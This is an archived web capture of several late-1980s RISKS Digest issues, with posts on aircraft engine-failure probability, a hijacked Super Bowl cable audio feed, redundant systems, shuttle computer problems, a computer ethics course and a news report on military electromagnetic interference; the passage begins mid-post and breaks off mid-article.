Actually, given that the probability of an engine failing during the trip,
year, etc. is p, and the probability of it not failing is q = 1 - p, then:

the probability of 0 engines failing is q**3
the probability of exactly 1 engine failing is 3 p q**2
the probability of exactly 2 engines failing is 3 p**2 q
the probability of all 3 engines failing is p**3

Given (we hope!) that p is very small, q is essentially 1, then p &gt;&gt;
p**2 &gt;&gt; p**3, so we can approximate:

  The probability of (at least) 1 engine failing is 3 p .
  The probability of (at least) 2 engines failing is 3 p**2 .

The trouble with "the probability of one engine failing is ... and the
probability of one of the remaining two failing is ..." is that is
double-counts the failures, for instance the probability of engine A failing,
*then* engine B is approximately 1/2 p**2, not p**2 as assumed by the previous
poster -- the other 1/2 p**2 times, engine B fails before engine A.

Dale Worley, Compass, Inc.                      compass!worley@think.com

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.13.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.15.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-65</DOCNO>
<DOCOLDNO>IA012-000131-B037-270</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.15.html 128.240.150.127 19970217025237 text/html 24568
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:50:46 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 15</TITLE>
<LINK REL="Prev" HREF="/Risks/8.14.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.16.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.14.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.16.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 15</H1>
<H2> Wednesday 25 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  More video piracy 
</A>
<DD>
<A HREF="#subj1.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computerized records of employee informers 
</A>
<DD>
<A HREF="#subj2.1">
Mike Trout
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Censorship and computers 
</A>
<DD>
<A HREF="#subj3.1">
Anthony Finkelstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Object Oriented Programming 
</A>
<DD>
<A HREF="#subj4.1">
Benjamin Ellsworth
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Structuring large systems 
</A>
<DD>
<A HREF="#subj5.1">
John Spragge
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  About non-redundant redudant systems 
</A>
<DD>
<A HREF="#subj6.1">
Elizabeth D. Zwicky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Engine-count and the Spirit of St. Louis 
</A>
<DD>
<A HREF="#subj7.1">
Michael McClary
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Counting engines 
</A>
<DD>
<A HREF="#subj8.1">
Jordan Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Space shuttle computer problems, 1981--1985 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Revised Computer Ethics Course Proposal 
</A>
<DD>
<A HREF="#subj10.1">
Bob Barger
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
More video piracy
</A>
</H3>
<address>
davy@riacs.edu    
&lt;<A HREF="mailto:Dave Curry">
Dave Curry
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 08:29:47 -0800
</i><PRE>

Taken from the San Jose Mercury News, Jan. 23, 1989.

Video pirates disrupt Super Bowl broadcast on L.A. cable system

  LOS ANGELES(AP) - Cable television viewers of the Super Bowl said video
pirates disrupted the audio portion of the play-by-play Sunday with music
from "The Jetsons" cartoon show and an anti-Semitic slur.
  "First there was music from 'The Jetsons' cartoon show.  Then someone said
something about Century Cable and 'There's too many (expletive deleted) Jews
in this industry,'" said Doug Debber, a viewer in Santa Monica.    [.....]
  The interruption occurred about 3:15 p.m., when an audio signal invaded
Century's cable system, he [Bill Rosendahl, a company spokesman] said.
Viewers in West Los Angeles, Santa Monica and Beverly Hills reported the
intrusion, Rosendahl said.   [.....]
  Company officials have contacted the FBI and Santa Monica police and were
planning to contact the Federal Communications Commission Monday morning, he
said.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computerized records of employee informers
</A>
</H3>
<address>
Mike Trout
&lt;<A HREF="mailto:miket@brspyr1.brs.com ">
miket@brspyr1.brs.com 
</A>&gt;
</address>
<i>
25 Jan 89 16:15:59 GMT
</i><PRE>

The 16 May 1988 issue of _Flagship_News_ (employee publication of American
Airlines) includes a small article on a spiffy way for employees to rat on
their fellow workers.  It's part of a nationwide computerized database on
"business abuse," which is apparently a euphemism for workers who don't measure
up to management's standards.  Listed examples of business abuse include 
theft, drug and alcohol abuse, unsafe work habits, and "any act not in the best
interest" of the employer.  All you have to do to destroy your fellow workers
is call the National Business Crime Information Network Inc. (known as "The
Network"), at 1-800-241-5689.  You may do this anonymously, as each caller is
simply assigned a code number.  This also allows you to call back later and
check to see what action has been taken against that guy in the next cubicle
who took a pencil home.  The Network says that your information is relayed to
top management, who it is claimed will not take any disciplinary action on the
basis of the phone call alone.

Right.                                         Michael Trout 
BRS Information Technologies, 1200 Rt. 7, Latham, N.Y. 12110  (518) 783-1161

  [If you make your ratfink call from a phone with automatic calling
  identification, do they store YOUR phone number as well?  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Censorship and computers
</A>
</H3>
<address>
&lt;<A HREF="mailto:acwf@doc.imperial.ac.uk">
acwf@doc.imperial.ac.uk
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 12:02:54 GMT
</i><PRE>

The following is taken from an advertisement which appeared in The Spectator (a
conservative review and comment journal of high repute) 14 Jan 1989.  The
advertisement was placed by INDEX ON CENSORSHIP a magazine which publishes
banned literature from all over the world, factual reports on writers and
journalists who have been silenced, as well as comment, interviews and a
country-by-country chronicle of censorship.

  "Dear Spectator Reader,

  Vaclav Havel, the well known Czechoslovak playwright, had his personal
  computer/word processor confiscated by police on 27 October 1988. I wonder
  if you would like to join with others in providing him with a replacement?

  Havel had the computer for just over a year and had been using it - for
  work and correspondence for only a month or two. It was obtained
  perfectly legally. He has written to the authorities to ask for his
  property back, but it has not yet been returned, nor is there any sign
  that it will be.

The letter continues by requesting contributions for a replacement. This is of
interest reflecting the risk that computers pose to oppressive states, the risk
of confiscation by the police of a vital tool of modern work and communication.

Anthony Finkelstein, Imperial College of Science, Technoloy &amp; Medicine
(University of London). UK.

   [I imagine replacements would be confiscated even more quickly, especially
   if more continue to arrive.  The police may be developing a taste for
   computers.  Besides, they may have discovered that the storage provides a
   convenient record of what he has written.  I wonder whether Glasnostradamus
   predicted things like this.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Object Oriented Programming (Risks-8.14)
</A>
</H3>
<address>
Benjamin Ellsworth 
&lt;<A HREF="mailto:ben%hpcvxben@hp-sde.sde.hp.com">
ben%hpcvxben@hp-sde.sde.hp.com
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 9:23:17 PST
</i><PRE>

[Regarding adding functionality without changing the code:]
&gt; I should hope the risks are obvious. [Ellsworth, <A HREF="/Risks/8.14.html">RISKS-8.14</A>]
 &gt;&gt;MBR@PELICAN-SPIT.ACA.MCC.COM        [Message to Ellsworth and RISKS]
 &gt;&gt;from "Mark Rosenstein" at Jan 25, 89 6:07 am
 &gt;&gt; ...Oh dear. They're not obvious to me. If change means modify existing
 &gt;&gt; code, then I can't quite see the problem, if change means add code, 
 &gt;&gt; yep you'll have to add code to get more functionality.          Mark.

To detail the exchange seems to me to be a bit maudlin, so let me just say that
we were talking about adding/changing functionality to an object.  The
professor's statements were cleary pointed toward no change neccessary to the
code comprising the object.

The risks are:

	- Merely parroting the party line (OOP eliminates changes to
	  operational code), and not thinking carefully about the question.
	  This seems especially dangerous when instructing the empowered
	  naive.  There were managers and engineers who were receiving
	  their first exposure to OOP in that class.  They were going to
	  try to use the information from that class in real products.
	  Their (the empowered naive) perceptions and beliefs are soon
	  going to effect other people's lives.
	
	- Management hearing the party line and accepting a "panacea" type
	  solution.  This is an "oldie-but-goodie" (maybe even in the
	  all-time top ten) in the category of "Engineer's Gripes," and
	  it's currently getting a thorough flogging in RISKS.

The above in no way reflects the views of Hewlett-Packard Company.

Benjamin Ellsworth    ben%hp-pcd@hp-sde.sde.hp.com

   [There are indeed lots of ways to get a program to do something else
   without modifying the code.  Moving it from one directory to another
   can have all sorts of side-effects, especially in a system with search
   strategies.  Not moving it but altering the search strategy for subtended
   programs is another way.  Redefining parameters, abbreviations, user
   profiles, etc., is another.  How about inadvertent effects resulting from
   someone else innocently introducing an operating system change?  All of this
   relates to the old saw about hardware degrades but software does not.  Not
   true.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Structuring large systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:John.Spragge@QueensU.CA">
John.Spragge@QueensU.CA
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 17:08-0500
</i><PRE>

By all means, we need new structures. There's no question about that.
The only question is, what should we build those new structures on?

I believe that the problem of relating the behaviour of a program to
it's (human-readable) static representation has been solved at a
"micro" level. And, pace the disbelievers in structured programming,
I believe that structured techniques represent the best solution at
the procedure level. The question is the a matter of tying a large
number of procedures into a workable, consistent, large system.

The answer to that, it seems to me, is to envisage the system as a machine
(needless to say, programs are, in the strict sense, machines in the same way
computers are). The starting point for fulfilling the requirements of an
end-user who wants a particular software product is to ask what sort of
"special purpose" computer would be best at solving that problem. The program
can then be structured as an attempt to simulate that system on a
general-purpose computer.

For example, a good analogy for writing a spreadsheet would probably be a large
array (or "matrix") processor, in which every cell could simulate a "processor"
having access to a central series of processing functions. A windowing system
can be written as an "ideal" terminal device.

This approach has the advantage of encouraging the same sort of "generality" in
design that computer hardware benefits from; the adders on a system generally
work because the system has just one general purpose adder, not a vast series
of different adders.  In the same way, a wide variety of the functions in a
system which appear to be very different share many (if not most) critical
attributes, and sufficiently flexible routines can be devised, in many cases,
to apply to all the disparate functions required.

This is only one approach to the "larger" structure of systems design. But when
building a large building, it does no good at all to discard the girders.
Orthodox "structured" programming techniques are, I am convinced, at the heart
of building reliable procedures, without which no large system can be built. It
isn't possible to build a giant program on nothing but the knowledge of Ifs,
Whiles, and Cases; but they are essential components of good programming.

John G. Spragge, Computing Consultant, Box 2042, Kingston Ont. (SPRAGGEJ@QUCDN)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
About non-redundant redudant systems        (Re: <A HREF="/Risks/8.14.html">RISKS-8.14</A>)
</A>
</H3>
<address>
Elizabeth D. Zwicky 
&lt;<A HREF="mailto:zwicky@cis.ohio-state.edu">
zwicky@cis.ohio-state.edu
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 11:14:04 EST
</i><PRE>

Of our many computer rooms and labs, 2 have redundant air-conditioning systems.
One of them has two separate systems installed at two completely different
times by two different companies; it gained redundancy out of necessity because
the first air conditioner barely had the capacity.  The second one started out
with two air conditioners, because it seemed like a good idea. They were
installed at the same time, by the same company.  Less than a month later, that
room started getting hotter and hotter and hotter.  We called A/C repair. They
said they would log it as non-emergency, due to the second A/C in the room. We
pointed out that the second A/C was not air conditioning any more than the
first was. They grudgingly updated it to an emergency call, and in short order
one of Ohio State's people arrived. 5 minutes later he developed an amazed/
appalled look, and began to curse.  "What the hell sort of a redundant system
is this?  What do those jerks think they are playing at?" It seems that our two
A/Cs had but one thermostat, which had duly failed. Needless to say, Ohio State
made all sorts of grief for the vendor, who eventually managed to make the
systems more redundant. Nevertheless, reliability is *still* higher in the
cobbled-together, afterthought-redundant system, than in the "properly"
designed one.

Elizabeth D. Zwicky, Ohio State University Computer and Information Science

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Engine-count and the Spirit of St. Louis
</A>
</H3>
<address>
Michael McClary
&lt;<A HREF="mailto:xanadu!michael@uunet.UU.NET ">
xanadu!michael@uunet.UU.NET 
</A>&gt;
</address>
<i>
Sat, 21 Jan 89 01:29:46 PST
</i><PRE>
Organization: Xanadu Operating Company, Palo Alto, CA

The more-is-less phenomenon of aircraft engine reliability has been noted
previously.

During the push to extend aircraft technology to non-stop trans-Atlantic
flight, most of the designs were multi-engined.  The designers of the
Spirit of St. Louis recognized:

 - they were on the edge of the technology, therefore
 - there was insufficient spare capacity to carry a dead engine, and
 - there was nowhere to land for repairs, therefore
 - all the engines would have to run for essentially the whole flight, so
 - assuming roughly equal engine mean-time-to-failure, the more engines,
   the greater the risk of failure (with loss of craft and pilot).

Thus the Spirit of St. Louis was designed with a single engine.

It's a classic examples of the counter-intuitive nature of probability
theory and risk assessment.

(Of course, practical service had to wait a bit, until aircraft capacity
and airport availability improvements made single-engine-failure survivable.)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Counting engines
</A>
</H3>
<address>
Jordan Brown &lt;jbrown@herron.UUCP&gt; 
&lt;<A HREF="mailto:jbrown@jato.Jpl.Nasa.Gov">
jbrown@jato.Jpl.Nasa.Gov
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 19:55:01 PDT
</i><PRE>

Don Alvarez &lt;boomer@space.mit.edu&gt; writes:
&gt; Imagine two planes which are identical except that one plane has 2
&gt; Bratt&amp;Zittley Foobar-900 engines, and the other has 3 B&amp;Z F-900 engines.
&gt; Well, clearly the second will fly better on n-1 engines, ...

This is the misconception that I'm trying to point out.  If you have an
airplane which flies fine on two B&amp;Z F-900s (meets single-engine performance
requirements, etc) then no manufacturer would ever put another engine on that
airplane.  It just wouldn't make sense.  (This is for civilian applications;
military apps have other issues.)  The three-engine airplane discussed will
either be bigger or have wimpier engines.  The controlling factor is engine-out
performance.  The two-engine airplane with one out will have performance
comparable to the three-engine airplane with one out.

727 engines (3/airplane) are wimpy compared to DC-9 engines (2/airplane).
BAe-146 engines (4/airplane) are *really* wimpy.  (This assumes that
727s are approximately the same size as DC-9s.  Bae-146's are smaller.)

Jordan Brown 

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Space shuttle computer problems, 1981--1985
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 24 Jan 89 00:25:52 -0500
</i><PRE>

&gt;STS-6, April 4, 1983: ... Landing gear must be manually deployed after computer
&gt;fails to trigger its descent.

I wonder if this is not mistaken reporting at some level.  My recollection,
possibly incorrect, is that lowering of landing gear is specifically not
under computer control in the space shuttle -- it *has* to be done manually.
The reason is that once lowered, the shuttle's landing gear is *down* --
it can't be raised again in flight.

Possibly the problem was that the computer did not say "time to lower the gear"?
                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
 Revised Computer Ethics Course Proposal
</A>
</H3>
<address>
Bob Barger 
&lt;<A HREF="mailto:CFRNB@ECNCDC.BITNET">
CFRNB@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Wed 25 Jan 1989 09:34 CDT
</i><PRE>

The following revision is based on critiques received on a proposal published
in RISKS digest 7.75. Comments are still welcome (send to CFRNB@ECNCDC.BITNET).
Course Description: The course will investigate current ethical issues
involving computers.  While it is not a "computer course," students will make
frequent use of postings on the electronic bulletin board of the ECN mainframe
computer to research and discuss ethical issues. Prerequisites: 75 Semester
Hours and previous experience with computers. [Class size limit = 15 students
for Fall, 1989, semester]. Outline of topics: Week 1: Orientation to the course
(introduction, explanation of course content, class procedures, and evaluation
methodology). Consideration of ethical theory. Week 2: Consideration of ethical
theory (continued). Week 3:  On-line reading of the "Discussion of Ethics in
Computing" list, the "Forum on Risks to the Public in Computers and Related
Systems" digest, and the "Computers and Society" list (all are available on the
ECN bulletin board); written reactions to these readings, and written
commentary on other students' reactions. [The instructor will insure that these
activities equate to the activities of a traditional two hour class meeting].
Week 4: Consideration of professional ethics. Week 5: Same activities as for
Week 3. Week 6:  Consideration of liability for software design, manufacture,
and use.  Week 7: Same activities as for Week 3. Week 8: Consideration of
privacy issues. Week 9: Same activities as for Week 3. Week 10:  Consideration
of power/control issues. Week 11: Same activities as for Week 3. Week 12:
Consideration of ownership and theft issues.  Weeks 13 &amp; 14: Same activities as
for Week 3. Week 15: Seminar members will reconvene as a group for the last
meeting to allow for group reflection on the seminar experience and course
evaluation.  Semester Exam week: Final Examination. Writing component: Students
will type thirteen 30-to-50 line (i.e., one-to-two page) reactions to the
on-line electronic bulletin board readings. Students will "post" these
reactions (i.e., electronically send them to the mainframe computer bulletin
board set aside for members of this seminar). In their reactions, students
will: 1) identify the particular publication or publications to which they are
reacting, 2) identify the particular issue or issues raised in the
publication(s), 3) identify the ethical implications of the issue or issues, 4)
identify the ethical paradigm used by the author, 5) add their own reasons for
agreement or disagreement with the viewpoint of the publication's author, 6)
and, finally, offer an alternative solution or viewpoint to that presented by
the author, or present other appropriate considerations not raised by the
author or covered in their own (i.e., the student's own) previous comments. The
instructor will send weekly, by confidential electronic mail, a grade on the
student's posted reaction, together with whatever comments the instructor
thinks helpful. The student's original posted reaction will also be open to
public comment by the other students in the seminar [this is accomplished by
posting notes to the bulletin board, referencing the original posted reaction].
These latter comments by the other students in the seminar will be considered
along with classroom discussion in computing the "participation" factor of the
student's semester grade. Evaluation: Each student's semester grade for the
seminar will be calculated according to the following weighted formula: 13
posted reactions (at 5% each) = 65% ; Participation (based on class discussion
and posted comments on other students' reactions) = 20%; Final Exam = 15%.
Materials in the course will include: 1) Texts: Deborah Johnson, Computer
Ethics (Englewood Cliffs, NJ: Prentice Hall, 1985); privately published notes
on systematic ethics from Dr. Barger's Philosophy 1800 class (furnished free to
seminar members); postings on the above-mentioned ECN electronic bulletin board
lists. 2) Resource people: Computer professionals (e.g., administrators,
systems analysts, programmers, etc.) will be utilized as guest contributors to
the class. This will be accomplished by personal appearances, as well as by
electronically mediated conferencing (e.g., postings, e-mail, relay
round-tables, etc.).

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.14.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.16.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-66</DOCNO>
<DOCOLDNO>IA012-000131-B037-291</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.16.html 128.240.150.127 19970217025259 text/html 21264
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:51:29 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 16</TITLE>
<LINK REL="Prev" HREF="/Risks/8.15.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.17.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.15.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.17.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 16</H1>
<H2> Thursday 26 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Cable video piracy 
</A>
<DD>
<A HREF="#subj1.1">
anonymous
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  F-111 downed by EMI? 
</A>
<DD>
<A HREF="#subj2.1">
Gordon Davisson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  F-16 that can't stall falls from sky 
</A>
<DD>
<A HREF="#subj3.1">
Mike Tanner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Probability and Product Failure [common mode failures] 
</A>
<DD>
<A HREF="#subj4.1">
Bruce Hamilton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Discrete probability and airplanes 
</A>
<DD>
<A HREF="#subj5.1">
Dave Settle
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Micro-cellular phones 
</A>
<DD>
<A HREF="#subj6.1">
Steven C. Den Beste
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Looking for Computer Folklore 
</A>
<DD>
<A HREF="#subj7.1">
Karla Jennings via Vernard C. Martin
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Cable video piracy
</A>
</H3>
<address>
&lt;<A HREF="mailto:[anonymous]">
[anonymous]
</A>&gt;
</address>
<i>
Wed, 25 Jan 89 18:40:10 PST
</i><PRE>

Subject: Century Cable video "pirate" [<A HREF="/Risks/8.15.html">RISKS-8.15</A>]

It appears likely that this was not truly a case of piracy, but rather
an "inside job" of employee sabotage.

There are some pretty good reasons for suspecting this:

1) The content of the audio.  It consisted of one voice introducing the
   next as a person who is a manager/executive at Century cable.  The name
   used was indeed an actual person at Century, but of course that person
   himself was presumably not actually involved.  The introduced voice
   did a pretty poor Reagan imitation, by the way.

2) Technical evidence.  On the channel of the superbowl, and ONLY that
   channel, the normal audio was cleanly removed and replaced with the
   offending audio.  Without going into technical detail, it would be
   extremely difficult to REPLACE the audio on only one channel of the cable
   (through the cable itself) without interfering with other channels and
   in general disrupting other channels at least for short periods.  To
   replace audio requires a full demodulation/re-modulation, not just a
   "simple" RF insertion into the RF of the cable.

   The most likely point for insertion of the audio was WITHIN the cable
   company headend itself, where each channel video and audio is
   individually modulated onto the cable.  This would require physical
   access to the inside of the headend facility.

3) Century Cable has been having labor difficulties (note the use of a 
   company manager's name in (1) above).

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
F-111 downed by EMI?
</A>
</H3>
<address>
Gordon Davisson
&lt;<A HREF="mailto:gordon@june.cs.washington.edu ">
gordon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
Thu, 26 Jan 89 00:26:04 PST
</i><PRE>

Copied without permission from the Seattle Times, Jan. 20, 1989:

by Mark Thompson, Knight-Ridder Newspapers

   WASHINGTON -- When U.S. warplanes were ordered to strike Libya in 1986,
they ran into an electronic blizzard the Pentagon now suspects might have
caused one of the fighters to crash and others to miss their targets.
   The disruption came not from the Libyans but from U.S. military
transmitters that filled the night sky with electronic signals designed to
jam Libya's anti-aircraft defenses, hunt down targets, guide weapons and
communicate.
   The Pentagon is so alarmed by the problem that it has launched a $35
million effort to identify the interference and keep it from happening
again, according to Air Force Col. Charles Quisenberry, who is leading the
probe.
   During the Libyan strike, U.S. weapons "were interfering with each
other, and they (U.S. commanders) came back out of that and they said:
'Look, we've got some problems here, and we want to know if we're doing it
to ourselves, or if the bad guys did it to us,'" Quisenberry said in an
interview.  "The end result was we found out we did it to ourselves."
   President Reagan ordered the April 1986 strike after U.S. intelligence
linked Libya to the terrorist bombing of a West German nightclub in which
an American serviceman was killed.
   Quisenberry said the radiowave interference might have lead to the
downing of an F-111 warplane, whose two crew members were the only U.S.
fatalities in the attack.  "It could have," he said.  "We couldn't rule it
out or say that that was the cause."
   Last Friday, Libya returned the body of one of the fliers, Maj. Fernando
Ribas-Dominicci of Utuado, Puerto Rico.  The body of the other pilot, Capt.
Paul Lorence of San Francisco, is still missing.
   Numerous U.S. weapons, some of which were electronically guided, went
astray during the attack, damaging three foreign embassies and diplomatic
residences, including those of France and Japan.  Seven of the 32 remaining
planes -- including five F-111s -- aborted their missions without firing a
shot because of unspecified problems.
   Recent Pentagon studies have shown that some combinations of U.S.
weapons transmitting at certain frequencies can bring down American
warplanes, Quisenberry said.  "Some are very, very critical -- some cause
aircraft to crash."
   Quisenberry recently finished a classified seven-month investigation
of the problem, which led top Pentagon officials to order the new
investigation.
   Research may yield embarrassment, Quisenberry acknowledged.  "Many
people have told us that a lot of people will not be happy with what we
find out because we'll actually uncover problems," he said.  "If there's
a problem with the B-1 that might not be politically acceptable, people
may have some heartburn with that."  In the past, Quisenberry said, the
Pentagon too often has ignored its own safeguards designed to protect
weapons from electromagnetic interference.  "EMI just got a low priority,"
he said.
   "In many cases, a program manager will get an exemption for getting a
